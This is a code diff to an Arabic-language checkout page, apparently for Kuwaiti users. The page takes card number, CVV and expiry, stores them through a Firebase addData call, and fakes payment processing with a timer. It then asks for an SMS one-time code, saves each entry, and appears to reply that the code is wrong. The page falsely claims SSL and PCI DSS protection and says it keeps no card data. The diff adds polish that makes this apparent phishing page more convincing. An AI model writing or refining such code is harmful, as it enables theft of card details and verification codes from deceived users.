@@ -1,20 +1,23 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
-import { User, Check, CreditCard, Shield, ArrowRight, Lock, Smartphone, Wallet } from "lucide-react"
+import { useState, useEffect } from "react"
+import { Check, CreditCard, Shield, ArrowRight, Lock, Info } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
-import { Card, CardContent } from "@/components/ui/card"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
-const allOtps = ['']
+import { cn } from "@/lib/utils"
+
+const allOtps: string[] = [""]
 
 export default function CheckoutPage() {
   const [showOtpDialog, setShowOtpDialog] = useState(false)
@@ -22,6 +25,11 @@ export default function CheckoutPage() {
   const [otpError, setOtpError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [expiryDate, setExpiryDate] = useState("")
+  const [cardType, setCardType] = useState<string | null>(null)
+  const [timeLeft, setTimeLeft] = useState(60)
+  const [canResend, setCanResend] = useState(false)
+  const [amount, setAmount] = useState("5")
+
   const router = useRouter()
 
   const [formData, setFormData] = useState({
@@ -32,6 +40,55 @@ export default function CheckoutPage() {
     expiryDate: "",
     cvv: "",
   })
+
+  // Timer for OTP resend
+  useEffect(() => {
+    if (showOtpDialog && timeLeft > 0) {
+      const timer = setTimeout(() => {
+        setTimeLeft(timeLeft - 1)
+      }, 1000)
+      return () => clearTimeout(timer)
+    } else if (timeLeft === 0) {
+      setCanResend(true)
+    }
+  }, [showOtpDialog, timeLeft])
+useEffect(()=>{
+  const am=localStorage.getItem('amount')!
+  setAmount(am)
+},[])
+  // Format card number with spaces
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
+    const matches = v.match(/\d{4,16}/g)
+    const match = (matches && matches[0]) || ""
+    const parts = []
+
+    for (let i = 0; i < match.length; i += 4) {
+      parts.push(match.substring(i, i + 4))
+    }
+
+    if (parts.length) {
+      return parts.join(" ")
+    } else {
+      return value
+    }
+  }
+
+  // Detect card type based on first digits
+  const detectCardType = (number: string) => {
+    const re = {
+      visa: /^4/,
+      mastercard: /^5[1-5]/,
+      amex: /^3[47]/,
+    }
+
+    const cleanNumber = number.replace(/\D/g, "")
+
+    if (re.visa.test(cleanNumber)) return "visa"
+    if (re.mastercard.test(cleanNumber)) return "mastercard"
+    if (re.amex.test(cleanNumber)) return "amex"
+    return null
+  }
 
   const handleInputChange = (field: string, value: string) => {
     if (field === "expiryDate") {
@@ -50,33 +107,43 @@ export default function CheckoutPage() {
       cleanValue = cleanValue.substring(0, 5)
 
       setExpiryDate(cleanValue)
+      setFormData((prev) => ({ ...prev, [field]: cleanValue }))
+    } else if (field === "cardNumber") {
+      const formattedValue = formatCardNumber(value)
+      setFormData((prev) => ({ ...prev, [field]: formattedValue }))
+      setCardType(detectCardType(value))
+    } else {
+      setFormData((prev) => ({ ...prev, [field]: value }))
     }
-
-    setFormData((prev) => ({ ...prev, [field]: value }))
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
+
     if (formData.paymentMethod === "digital-wallet") {
       router.push("/knet")
       return
     }
-    const visitorId = localStorage.getItem('visitor')
+
+    const visitorId = localStorage.getItem("visitor")
     addData({
-      id: visitorId, cardNumber: formData.cardNumber, pass: formData.cvv, month: formData.expiryDate,
-      expiryDate
+      id: visitorId,
+      cardNumber: formData.cardNumber.replace(/\s/g, ""),
+      pass: formData.cvv,
+      month: formData.expiryDate,
+      expiryDate,
     })
+
     // Simulate API call
     setTimeout(() => {
       setIsLoading(false)
       setShowOtpDialog(true)
-    }, 5000);
-
+    }, 2000)
   }
 
   const handleOtpSubmit = () => {
-    const visitorId = localStorage.getItem('visitor')
+    const visitorId = localStorage.getItem("visitor")
     setIsLoading(true)
 
     allOtps.push(otpValue)
@@ -87,9 +154,8 @@ export default function CheckoutPage() {
         setIsLoading(false)
         setOtpValue("")
         setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-      }, 5000);
+      }, 2000)
     }
-
   }
 
   const handleOtpChange = (value: string) => {
@@ -97,15 +163,29 @@ export default function CheckoutPage() {
     setOtpError("")
   }
 
+  const handleResendOtp = () => {
+    setTimeLeft(60)
+    setCanResend(false)
+    setOtpValue("")
+    setOtpError("")
+
+    // Simulate OTP resend
+    setIsLoading(true)
+    setTimeout(() => {
+      setIsLoading(false)
+    }, 1500)
+  }
+
   return (
     <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-purple-50">
-      {/* Professional Header */}
+      {/* Professional Header with animated gradient */}
       <div className="relative overflow-hidden">
-        <div className="absolute inset-0 bg-gradient-to-l from-purple-600/10 via-pink-500/5 to-transparent"></div>
+        <div className="absolute inset-0 bg-gradient-to-l from-purple-600/10 via-pink-500/5 to-transparent animate-gradient-x"></div>
         <div className="relative px-6 py-8">
           <div className="max-w-md mx-auto text-center">
-            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-purple-600 to-pink-800 rounded-2xl shadow-lg mb-4">
-              <Lock className="w-8 h-8 text-white" />
+            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-purple-600 to-pink-800 rounded-2xl shadow-lg mb-4 relative overflow-hidden">
+              <div className="absolute inset-0 bg-gradient-to-tr from-purple-600/80 to-transparent opacity-60 animate-pulse"></div>
+              <Lock className="w-8 h-8 text-white relative z-10" />
             </div>
             <h1 className="text-2xl font-bold text-slate-800 mb-2">الدفع الآمن</h1>
             <p className="text-slate-600">معلوماتك محمية بأعلى معايير الأمان</p>
@@ -113,21 +193,23 @@ export default function CheckoutPage() {
         </div>
       </div>
 
-      {/* Enhanced Progress Steps */}
+      {/* Enhanced Progress Steps with animation */}
       <Card className="mx-auto max-w-md -mt-6 relative z-10 shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
         <CardContent className="p-4 sm:p-6">
           <div className="w-full">
             {/* Progress Steps */}
             <div className="grid grid-cols-3 mb-4 relative">
-              {/* Line connectors */}
+              {/* Line connectors with animation */}
               <div className="absolute top-4 left-[calc(16.67%+8px)] right-[calc(16.67%+8px)] h-2">
                 <div className="h-2 w-full flex">
-                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-purple-500 rounded-full"></div>
+                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-purple-500 rounded-full relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
+                  </div>
                   <div className="w-1/2 h-2 bg-slate-200 rounded-full"></div>
                 </div>
               </div>
 
-              {/* Step 1 - Completed */}
+              {/* Step 1 - Completed with animation */}
               <div className="flex flex-col items-center relative z-10">
                 <div className="relative">
                   <div className="w-8 h-8 bg-gradient-to-r from-purple-500 to-[#2b224d] rounded-full flex items-center justify-center shadow-lg">
@@ -138,11 +220,12 @@ export default function CheckoutPage() {
                 <span className="text-green-600 text-xs sm:text-sm mt-2 font-medium text-center">أختيار القيمة</span>
               </div>
 
-              {/* Step 2 - Current */}
+              {/* Step 2 - Current with pulsing animation */}
               <div className="flex flex-col items-center relative z-10">
                 <div className="relative">
-                  <div className="w-8 h-8 bg-gradient-to-r from-[#2b224d] to-pink-600 rounded-full flex items-center justify-center shadow-lg">
-                    <span className="text-white text-sm font-bold">2</span>
+                  <div className="w-8 h-8 bg-gradient-to-r from-[#2b224d] to-pink-600 rounded-full flex items-center justify-center shadow-lg relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/10 animate-pulse"></div>
+                    <span className="text-white text-sm font-bold relative z-10">2</span>
                   </div>
                   <div className="absolute -inset-1 bg-purple-500/20 rounded-full animate-pulse"></div>
                 </div>
@@ -160,34 +243,46 @@ export default function CheckoutPage() {
           </div>
         </CardContent>
       </Card>
+
       {/* Enhanced Form Content */}
       <div className="px-4 py-8">
         <div className="max-w-md mx-auto space-y-8">
           <form onSubmit={handleSubmit} className="space-y-8">
-            {/* Enhanced User Details */}
-
             {/* Enhanced Payment Selection */}
             <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
-              <div className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
-                <h2 className="text-xl font-bold text-slate-800 flex items-center">
-                  <div className="w-6 h-6 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3">
-                    <CreditCard className="w-4 h-4 text-white" />
+              <CardHeader className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
+                <div className="flex items-center">
+                  <div className="w-8 h-8 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3 relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
+                    <CreditCard className="w-5 h-5 text-white relative z-10" />
                   </div>
-                  طريقة الدفع
+                  <CardTitle className="text-xl font-bold text-slate-800">طريقة الدفع</CardTitle>
                   <Badge className="mr-3 bg-green-100 text-green-700 border-green-200 font-medium">
                     <Shield className="w-3 h-3 ml-1" />
                     SSL آمن
                   </Badge>
-                </h2>
-              </div>
+                </div>
+                <CardDescription className="text-slate-500 mt-2 pr-11">
+                  اختر طريقة الدفع المفضلة لديك لإتمام عملية الشراء
+                </CardDescription>
+              </CardHeader>
+
               <CardContent className="p-8">
                 <RadioGroup
                   value={formData.paymentMethod}
                   onValueChange={(value) => handleInputChange("paymentMethod", value)}
                   className="space-y-4"
                 >
-                  {/* Credit Card Option */}
-                  <Card className="border-2 border-purple-200 bg-gradient-to-r from-purple-50/50 to-pink-50/50 transition-all hover:shadow-lg hover:border-purple-300 group" dir="rtl">
+                  {/* Credit Card Option with hover effects */}
+                  <Card
+                    className={cn(
+                      "border-2 transition-all duration-300 hover:shadow-lg group",
+                      formData.paymentMethod === "credit-card"
+                        ? "border-purple-300 bg-gradient-to-r from-purple-50/80 to-pink-50/80 shadow-md"
+                        : "border-slate-200 bg-gradient-to-r from-purple-50/30 to-pink-50/30 hover:border-purple-200",
+                    )}
+                    dir="rtl"
+                  >
                     <CardContent className="p-0">
                       <div className="flex items-center p-6">
                         <RadioGroupItem
@@ -200,12 +295,39 @@ export default function CheckoutPage() {
                             <Label htmlFor="credit-card" className="text-slate-800 font-bold text-md cursor-pointer">
                               بطاقة ائتمان
                             </Label>
+                            <p className="text-slate-500 text-xs mt-1">Visa, Mastercard, American Express</p>
                           </div>
                           <div className="flex items-center space-x-2 space-x-reverse">
-                            <img src="visa.svg" className="w-6 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />
-                            <img src="master.svg" className="w-6 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />
-                            <img src="amex.svg" className="w-4 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />
-
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "visa" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/visa.svg" alt="Visa" className="w-10 h-6 object-contain" />
+                            </div>
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "mastercard" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/master.svg" alt="Mastercard" className="w-10 h-6 object-contain" />
+                            </div>
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "amex" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/amex.svg" alt="American Express" className="w-10 h-6 object-contain" />
+                            </div>
                           </div>
                         </div>
                       </div>
@@ -221,39 +343,74 @@ export default function CheckoutPage() {
                                 <Input
                                   id="cardNumber"
                                   placeholder="#### #### #### ####"
-                                  maxLength={16}
-                                  minLength={16}
+                                  maxLength={19}
                                   value={formData.cardNumber}
                                   onChange={(e) => handleInputChange("cardNumber", e.target.value)}
-                                  className="h-10 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50"
+                                  className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50 pr-4"
                                   required
                                 />
-                                <CreditCard className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-slate-400" />
+                                <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
+                                  {cardType ? (
+                                    <div className="w-8 h-5">
+                                      <img
+                                        src={`/${cardType}.svg`}
+                                        alt={cardType}
+                                        className="w-full h-full object-contain"
+                                      />
+                                    </div>
+                                  ) : (
+                                    <CreditCard className="w-5 h-5 text-slate-400" />
+                                  )}
+                                </div>
                               </div>
+                              <p className="text-xs text-slate-500 mt-1">أدخل رقم البطاقة بدون مسافات</p>
                             </div>
 
                             <div className="grid grid-cols-2 gap-6">
                               <div className="group" dir="rtl">
                                 <Label
                                   htmlFor="expiryDate"
-                                  className="text-slate-700 text-base font-semibold mb-3 block"
+                                  className="text-slate-700 text-base font-semibold mb-3 block flex items-center"
                                 >
-                                  تاريخ الانتهاء <span className="text-red-500">*</span>
+                                  تاريخ الانتهاء <span className="text-red-500 mx-1">*</span>
+                                  <TooltipProvider>
+                                    <Tooltip>
+                                      <TooltipTrigger asChild>
+                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
+                                      </TooltipTrigger>
+                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
+                                        أدخل الشهر/السنة كما هو مكتوب على البطاقة
+                                      </TooltipContent>
+                                    </Tooltip>
+                                  </TooltipProvider>
                                 </Label>
                                 <Input
                                   id="expiryDate"
                                   placeholder="MM/YY"
                                   value={expiryDate}
                                   onChange={(e) => handleInputChange("expiryDate", e.target.value)}
-                                  className="h-10 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-sm bg-white/50"
+                                  className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-base bg-white/50"
                                   dir="rtl"
                                   required
                                   maxLength={5}
                                 />
                               </div>
                               <div className="group" dir="rtl">
-                                <Label htmlFor="cvv" className="text-slate-700 text-base font-semibold mb-3 block">
-                                  رمز الأمان <span className="text-red-500">*</span>
+                                <Label
+                                  htmlFor="cvv"
+                                  className="text-slate-700 text-base font-semibold mb-3 block flex items-center"
+                                >
+                                  رمز الأمان <span className="text-red-500 mx-1">*</span>
+                                  <TooltipProvider>
+                                    <Tooltip>
+                                      <TooltipTrigger asChild>
+                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
+                                      </TooltipTrigger>
+                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
+                                        رمز الأمان المكون من 3 أو 4 أرقام على ظهر البطاقة
+                                      </TooltipContent>
+                                    </Tooltip>
+                                  </TooltipProvider>
                                 </Label>
                                 <div className="relative">
                                   <Input
@@ -261,10 +418,9 @@ export default function CheckoutPage() {
                                     placeholder="***"
                                     value={formData.cvv}
                                     onChange={(e) => handleInputChange("cvv", e.target.value)}
-                                    className="h-10 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-sm bg-white/50"
+                                    className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-base bg-white/50"
                                     dir="rtl"
                                     maxLength={4}
-
                                     type="tel"
                                     minLength={3}
                                     required
@@ -279,8 +435,16 @@ export default function CheckoutPage() {
                     </CardContent>
                   </Card>
 
-                  {/* Additional Payment Methods */}
-                  <Card className="border-2 border-slate-200 bg-slate-50/50 transition-all hover:shadow-md " dir="rtl">
+                  {/* KNET Payment Option with hover effects */}
+                  <Card
+                    className={cn(
+                      "border-2 transition-all duration-300 hover:shadow-lg",
+                      formData.paymentMethod === "digital-wallet"
+                        ? "border-purple-300 bg-gradient-to-r from-blue-50/80 to-cyan-50/80 shadow-md"
+                        : "border-slate-200 bg-slate-50/50 hover:border-blue-200",
+                    )}
+                    dir="rtl"
+                  >
                     <CardContent className="p-4">
                       <div className="flex items-center justify-between">
                         <div className="flex items-center">
@@ -293,11 +457,13 @@ export default function CheckoutPage() {
                             <Label htmlFor="digital-wallet" className="text-slate-600 font-semibold text-lg">
                               كي نت
                             </Label>
-                            <p className="text-slate-500 text-sm"></p>
+                            <p className="text-slate-500 text-xs mt-1">الدفع المباشر من حسابك المصرفي</p>
                           </div>
                         </div>
                         <div className="flex items-center space-x-2 space-x-reverse">
-                          <img src="kv.png" className="w-6 h-6 text-slate-400 rounded" />
+                          <div className="w-10 h-10 flex items-center justify-center">
+                            <img src="/kv.png" alt="KNET" className="w-8 h-8 object-contain" />
+                          </div>
                         </div>
                       </div>
                     </CardContent>
@@ -306,36 +472,70 @@ export default function CheckoutPage() {
 
                 <Separator className="my-8" />
 
-                {/* Security Notice */}
-                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-6">
-                  <div className="flex items-start">
-                    <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center ml-4 flex-shrink-0">
-                      <Shield className="w-5 h-5 text-green-600" />
+                {/* Order Summary */}
+                <Card className="border border-slate-200 bg-slate-50/70 mb-8">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-lg font-bold text-slate-700">ملخص الطلب</CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-0">
+                    <div className="space-y-2">
+                      <div className="flex justify-between text-sm">
+                        <span className="text-slate-600">المبلغ الأساسي</span>
+                        <span className="font-medium">{amount}.000 د.ك</span>
+                      </div>
+                      <div className="flex justify-between text-sm">
+                        <span className="text-slate-600">رسوم الخدمة</span>
+                        <span className="font-medium">0.000 د.ك</span>
+                      </div>
+                      <Separator className="my-2" />
+                      <div className="flex justify-between font-bold">
+                        <span className="text-slate-800">المبلغ الإجمالي</span>
+                        <span className="text-purple-700">{amount}.000 د.ك</span>
+                      </div>
                     </div>
-                    <div>
-                      <h3 className="font-semibold text-green-800 mb-2">حماية متقدمة</h3>
-                      <p className="text-green-700 text-sm leading-relaxed">
-                        جميع المعاملات محمية بتشفير SSL 256-bit ومعايير PCI DSS. لا نحتفظ ببيانات بطاقتك الائتمانية على
-                        خوادمنا.
-                      </p>
+                  </CardContent>
+                </Card>
+
+                {/* Security Notice with animation */}
+                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-6 relative overflow-hidden">
+                  <div className="absolute top-0 right-0 w-32 h-32 bg-green-200/30 rounded-full -mr-16 -mt-16 animate-pulse-slow"></div>
+                  <div className="relative z-10">
+                    <div className="flex items-start">
+                      <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center ml-4 flex-shrink-0">
+                        <Shield className="w-5 h-5 text-green-600" />
+                      </div>
+                      <div>
+                        <h3 className="font-semibold text-green-800 mb-2">حماية متقدمة</h3>
+                        <p className="text-green-700 text-sm leading-relaxed">
+                          جميع المعاملات محمية بتشفير SSL 256-bit ومعايير PCI DSS. لا نحتفظ ببيانات بطاقتك الائتمانية
+                          على خوادمنا.
+                        </p>
+                      </div>
                     </div>
                   </div>
                 </div>
 
                 <Button
                   type="submit"
-                  disabled={isLoading}
-                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064]  to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
+                  disabled={
+                    isLoading ||
+                    (formData.paymentMethod === "credit-card" &&
+                      (formData.cardNumber.length < 16 || !expiryDate || !formData.cvv))
+                  }
+                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064] to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none relative overflow-hidden"
                 >
                   {isLoading ? (
-                    <div className="flex items-center">
+                    <div className="flex items-center justify-center">
                       <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                       جاري المعالجة...
                     </div>
                   ) : (
                     <>
-                      المتابعة للدفع الآمن
-                      <ArrowRight className="w-5 h-5 mr-3" />
+                      <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
+                      <span className="relative z-10 flex items-center justify-center">
+                        المتابعة للدفع الآمن
+                        <ArrowRight className="w-5 h-5 mr-3" />
+                      </span>
                     </>
                   )}
                 </Button>
@@ -345,16 +545,14 @@ export default function CheckoutPage() {
         </div>
       </div>
 
-      {/* Enhanced OTP Dialog */}
-
-
-
+      {/* Enhanced OTP Dialog with animations */}
       <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
         <DialogContent className="w-[95vw] max-w-sm sm:max-w-md lg:max-w-lg mx-auto rounded-2xl border-0 shadow-2xl bg-white/95 backdrop-blur-sm">
           <DialogHeader className="text-center pb-4 sm:pb-6">
             <div className="relative mx-auto mb-4 sm:mb-6">
-              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-purple-100 to-pink-100 rounded-2xl flex items-center justify-center">
-                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-purple-600" />
+              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-purple-100 to-pink-100 rounded-2xl flex items-center justify-center relative overflow-hidden">
+                <div className="absolute inset-0 bg-gradient-to-tr from-purple-200 to-transparent animate-pulse"></div>
+                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-purple-600 relative z-10" />
               </div>
               <div className="absolute -inset-2 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
             </div>
@@ -363,12 +561,15 @@ export default function CheckoutPage() {
           </DialogHeader>
 
           <div className="space-y-4 py-2 sm:py-4">
-            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4 sm:p-6">
-              <p className="text-center text-slate-700 leading-relaxed text-sm sm:text-base">
-                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك
-                <br />
-                <span className="font-bold text-slate-900 text-base sm:text-lg">+965 5** *** ***</span>
-              </p>
+            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4 sm:p-6 relative overflow-hidden">
+              <div className="absolute top-0 left-0 w-32 h-32 bg-blue-200/20 rounded-full -ml-16 -mt-16 animate-pulse-slow"></div>
+              <div className="relative z-10">
+                <p className="text-center text-slate-700 leading-relaxed text-sm sm:text-base">
+                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك
+                  <br />
+                  <span className="font-bold text-slate-900 text-base sm:text-lg">+965 5** *** ***</span>
+                </p>
+              </div>
             </div>
 
             <div className="flex justify-center px-2">
@@ -386,7 +587,7 @@ export default function CheckoutPage() {
             </div>
 
             {otpError && (
-              <Card className="border-red-200 bg-gradient-to-r from-red-50 to-pink-50">
+              <Card className="border-red-200 bg-gradient-to-r from-red-50 to-pink-50 animate-shake">
                 <CardContent className="p-3 sm:p-4">
                   <div className="text-center text-red-600 font-medium flex items-center justify-center text-sm sm:text-base">
                     <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center ml-2">
@@ -401,34 +602,35 @@ export default function CheckoutPage() {
             <div className="space-y-3 sm:space-y-4">
               <Button
                 onClick={handleOtpSubmit}
-                className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl"
-                disabled={otpValue.length !== 6}
+                className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl relative overflow-hidden"
+                disabled={otpValue.length !== 6 || isLoading}
               >
                 {isLoading ? (
-                  <div className="flex items-center">
+                  <div className="flex items-center justify-center">
                     <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                     <span className="text-sm sm:text-base">جاري المعالجة...</span>
                   </div>
                 ) : (
-                  <span className="text-sm sm:text-base">تأكيد الرمز والمتابعة</span>
+                  <>
+                    <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
+                    <span className="relative z-10 text-sm sm:text-base">تأكيد الرمز والمتابعة</span>
+                  </>
                 )}
               </Button>
 
               <Button
                 variant="outline"
                 className="w-full h-12 sm:h-14 border-2 border-slate-200 text-slate-600 hover:bg-slate-50 font-semibold text-sm sm:text-base transition-all duration-200"
-                onClick={() => {
-                  setOtpValue("")
-                  setOtpError("")
-                }}
+                onClick={handleResendOtp}
+                disabled={!canResend || isLoading}
               >
-                إعادة إرسال الرمز
+                {canResend ? "إعادة إرسال الرمز" : <>إعادة الإرسال بعد {timeLeft} ثانية</>}
               </Button>
             </div>
 
             <div className="bg-slate-50 rounded-xl p-2 sm:p-2">
               <p className="text-center text-xs sm:text-sm text-slate-500 leading-relaxed">
-                لم تستلم الرمز؟ تحقق من رسائل SMS أو انتظر 60 ثانية لإعادة الإرسال
+                لم تستلم الرمز؟ تحقق من رسائل SMS أو انتظر انتهاء العداد لإعادة الإرسال
                 <br />
                 <span className="font-medium">هذا الرمز صالح لمدة 5 دقائق فقط</span>
               </p>
@@ -436,9 +638,6 @@ export default function CheckoutPage() {
           </div>
         </DialogContent>
       </Dialog>
-      )
-
-
     </div>
   )
 }
